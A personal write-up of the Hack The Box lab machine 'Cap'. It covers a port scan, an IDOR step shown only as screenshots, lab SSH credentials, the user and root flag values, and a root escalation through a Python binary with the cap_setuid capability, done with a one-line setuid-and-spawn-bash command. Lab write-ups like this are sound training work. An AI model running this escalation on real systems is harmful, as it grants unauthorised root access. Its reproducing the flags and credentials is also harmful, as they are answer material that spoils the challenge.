---
title: "Cap"
kind: writeup
tags:
  - hack-the-box-labs
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Easy"
difficulty-for-me: "Easy"
url: "https://app.hackthebox.com/machines/Cap"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: 83e759b9275182b8b20981c2784d03ac
---

# Cap

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Scanning on Ports

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ rustscan -a 10.129.6.89 -u 5000 -- -sS -T4
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.6.89:21
Open 10.129.6.89:22
Open 10.129.6.89:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sS -T4" on ip 10.129.6.89
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 16:18 IST
Initiating Ping Scan at 16:18
Scanning 10.129.6.89 [4 ports]
Completed Ping Scan at 16:18, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:18
Completed Parallel DNS resolution of 1 host. at 16:18, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:18
Scanning 10.129.6.89 [3 ports]
Discovered open port 22/tcp on 10.129.6.89
Discovered open port 21/tcp on 10.129.6.89
Discovered open port 80/tcp on 10.129.6.89
Completed SYN Stealth Scan at 16:18, 0.57s elapsed (3 total ports)
Nmap scan report for 10.129.6.89
Host is up, received echo-reply ttl 62 (0.39s latency).
Scanned at 2026-01-29 16:18:18 IST for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
           Raw packets sent: 7 (284B) | Rcvd: 6 (240B)

```

Visiting port 80

![[attachments/Hack The Box Labs/Hack The Box/Cap/image.png]]

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 1.png]]

Exploiting IDOR

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 2.png]]

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 3.png]]

```
username - nathan
password - Buck3tH4TF0RM3!
```

Login in SSH

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 4.png]]

Getting USER flag

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 5.png]]

```bash
nathan@cap:~$ ls
user.txt

nathan@cap:~$ cat user.txt
ad98dcdd3dbd6cc01c857fb6d6e296a6
```

Getting Root Flag

![[attachments/Hack The Box Labs/Hack The Box/Cap/image 6.png]]

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

nathan@cap:~$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

root@cap:~# cd root

root@cap:/root# cat root.txt
d5b997c6116dab119a03ab03369d55af

root@cap:/root#
```
